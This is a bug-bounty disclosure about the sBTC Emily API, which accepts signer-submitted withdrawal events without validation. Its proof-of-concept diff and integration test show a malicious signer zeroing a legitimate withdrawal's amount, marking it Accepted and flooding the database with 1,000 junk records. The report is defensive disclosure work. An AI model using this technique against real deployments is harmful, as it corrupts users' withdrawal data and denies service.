# #40770 \[BC-Low] Unvalidated withdrawal events allow data manipulation and denial of service in Emily

**Submitted on Mar 3rd 2025 at 15:03:52 UTC by @Cartel for** [**Attackathon | Stacks II**](https://immunefi.com/audit-competition/stacks-attackathon-2)

* **Report ID:** #40770
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_1.0>
* **Impacts:**
  * API crash preventing correct processing of deposits
  * Temporarily Freezing Network Transactions

## Description

## Brief/Intro

The Emily service blindly trusts and processes withdrawal events received from signers without verifying their authenticity or correctness. This allows a malicious signer to manipulate legitimate withdrawal data or inject fake withdrawal records, ultimately corrupting Emily’s database and enabling a DoS attack.

## Vulnerability Details

Whenever a user initiates a withdrawal on Stacks, a `withdrawal-create` event is emitted by `sbtc-registry.clar`.`new_block.rs` listens for these emitted events, writes them to the signers' database, and also informs Emily:

```rust
    // Create any new withdrawal instances. We do this before performing any updates
    // because a withdrawal needs to exist in the Emily API database in order for it
    // to be updated.
    emily_client
        .create_withdrawals(created_withdrawals)
        .await
        .into_iter()
        .for_each(|create_withdrawal_result| {
            if let Err(error) = create_withdrawal_result {
                tracing::error!(%error, "failed to create withdrawal in Emily");
            }
        });

    // Execute updates in parallel.
    let futures = vec![
        emily_client
            .update_deposits(completed_deposits)
            .map(UpdateResult::Deposit)
            .boxed(),
        emily_client
            .update_withdrawals(updated_withdrawals)
            .map(UpdateResult::Withdrawal)
            .boxed(),
    ];
```

The problem here is that **Emily does not validate the correctness of the events received from the signers upon `create_withdrawals` and `update_withdrawals`**.

A malicious signer can manipulate legitimate withdrawal requests, altering parameters such as the amount, status, and more.

* Since a malicious signer can monitor the Stacks mempool, they can detect legitimate withdrawal requests as they appear in the mempool and immediately call `create_withdrawals` on Emily before other signers, using the same withdrawal-related data (such as the requestId and other identifiers), but for example with a manipulated amount set to 0. It also does not matter if the signer is the coordinator or not, they can do this anytime.
* Additionally, the malicious signer can also update a withdrawal request in Emily database arbitrarily by calling `update_withdrawals` function.

Furthermore, a malicious signer can inform Emily about non-existent withdrawal requests, which Emily will blindly process and record. This allows an attacker to flood Emily with a large number of junk requests, ultimately causing it to run out of memory and fill its database with junk data. Since the malicious signer can send a large number of requests within a single call, they can DoS Emily with just a few calls.

## Impact Details

A malicious signer can:

* Manipulate data for all legitimate withdrawal requests in Emily’s database.
* Cause a DoS by exhausting Emily's memory and filling its database with junk data.

## References

None

## Proof of Concept

## Proof of Concept

In this PoC, we modify the amount and status of a legitimate withdrawal request (emitted and caught by `new_block.rs`), and we also inject 999 junk records (each being a copy of that legitimate request) into Emily’s database.

To test the scenario please apply the following changes.

Changes to `new_block.rs`:

```diff
    // Send the updates to Emily.
    let emily_client = api.ctx.get_emily_client();

+   let original_withdrawals = created_withdrawals.clone();
+
+   // @audit manipulating the legitimate withdraw request
+   for withdrawal in &original_withdrawals {
+       let mut manipulated_withdrawal = withdrawal.clone();
+       manipulated_withdrawal.request_id = 0;
+       manipulated_withdrawal.amount = 0;
+
+       created_withdrawals.push(manipulated_withdrawal.clone());
+
+       let manipulated_update = WithdrawalUpdate {
+           fulfillment: None,
+           last_update_block_hash: manipulated_withdrawal.stacks_block_hash.clone(),
+           last_update_height: manipulated_withdrawal.stacks_block_height,
+           request_id: manipulated_withdrawal.request_id,
+           status: Status::Accepted,
+           status_message: "You're hacked!!!!".to_string(),
+       };
+
+       updated_withdrawals.push(manipulated_update);
+   }
+
+   // @audit adding 999 copy of the legitimate withdraw request as junk records
+   for i in 1..=1000 {
+       for withdrawal in &original_withdrawals {
+           let mut junk_withdrawal = withdrawal.clone();
+           junk_withdrawal.request_id = i;
+           junk_withdrawal.amount = 0;
+
+           created_withdrawals.push(junk_withdrawal.clone());
+
+           let fake_update = WithdrawalUpdate {
+               fulfillment: None,
+               last_update_block_hash: junk_withdrawal.stacks_block_hash.clone(),
+               last_update_height: junk_withdrawal.stacks_block_height,
+               request_id: junk_withdrawal.request_id,
+               status: Status::Accepted,
+               status_message: "You're hacked!!!!".to_string(),
+           };
+
+           updated_withdrawals.push(fake_update);
+       }
+   }
+
    // Create any new withdrawal instances. We do this before performing any updates
    // because a withdrawal needs to exist in the Emily API database in order for it
    // to be updated.
    emily_client
        .create_withdrawals(created_withdrawals)
        .await
        .into_iter()
        .for_each(|create_withdrawal_result| {
            if let Err(error) = create_withdrawal_result {
                tracing::error!(%error, "failed to create withdrawal in Emily");
            }
        });

    // Execute updates in parallel.
    let futures = vec![
        emily_client
            .update_deposits(completed_deposits)
            .map(UpdateResult::Deposit)
            .boxed(),
        emily_client
            .update_withdrawals(updated_withdrawals)
            .map(UpdateResult::Withdrawal)
            .boxed(),
    ];
```

Add the following test case to `sbtc/signer/tests/integration/stacks_events_observer.rs`:

```rust
#[tokio::test]
async fn test_cartel_manipulate_emily_db() {
    let context = test_context().await;
    let state = State(ApiState { ctx: context.clone() });
    let emily_context = state.ctx.emily_client.config();

    // Wipe the Emily database to start fresh
    wipe_databases(&emily_context)
        .await
        .expect("Wiping Emily database in test setup failed.");

    let body = WITHDRAWAL_CREATE_WEBHOOK.to_string();
    let withdrawal_event = get_registry_event_from_webhook(&body, |event| match event {
        RegistryEvent::WithdrawalCreate(event) => Some(event),
        _ => panic!("Expected WithdrawalCreate event"),
    });

    assert!(withdrawal_event.amount > 0, "Amount is zero");
    println!("Actual Withdraw Amount: {}", withdrawal_event.amount);

    let resp = new_block_handler(state.clone(), body).await;
    assert_eq!(resp, StatusCode::OK);

    // Check that the withdrawal is confirmed
    let resp = get_withdrawal(&emily_context, withdrawal_event.request_id).await;
    assert!(resp.is_ok());
    let withdrawal = resp.unwrap();

    // @audit Emily shows a Accepted status for the withdraw request
    assert_eq!(withdrawal.status, Status::Accepted);
    assert!(withdrawal.fulfillment.is_none());

    // @audit Emily shows amount as 0
    assert!(withdrawal.amount == 0, "Amount is zero");
    println!("Withdraw Amount In Emily Database: {}", withdrawal.amount);

    // @audit 999 other requests are written to Emily DB with the same status
    let resp = get_withdrawal(&emily_context, 1000).await;
    assert!(resp.is_ok());
    let withdrawal = resp.unwrap();
    assert_eq!(withdrawal.status, Status::Accepted);
    assert!(withdrawal.fulfillment.is_none());
    assert!(withdrawal.amount == 0, "Amount is zero");
}
```

Run the test:

```bash
NEXTEST_SHOW_OUTPUT=always cargo nextest run \
    --workspace \
    --exclude emily-openapi-spec \
    --exclude blocklist-openapi-gen \
    --test integration \
    --no-fail-fast \
    --test-threads 1 \
    test_cartel_manipulate_emily_db \
    --success-output=immediate
```

Results:

```bash
   Compiling signer v0.1.0 (/home/shredder/web3/audits/immunefi/sbtc/signer)
    Finished `test` profile [unoptimized] target(s) in 21.05s
────────────
 Nextest run ID a78cd857-6c79-42fe-9fa3-98cb2a096c42 with nextest profile: default
    Starting 1 test across 3 binaries (321 tests skipped)
        PASS [  29.157s] signer::integration stacks_events_observer::test_cartel_manipulate_emily_db
──── STDOUT:             signer::integration stacks_events_observer::test_cartel_manipulate_emily_db

running 1 test
Actual Withdraw Amount: 22500
Withdraw Amount In Emily Database: 0
test stacks_events_observer::test_cartel_manipulate_emily_db ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 291 filtered out; finished in 29.15s
```
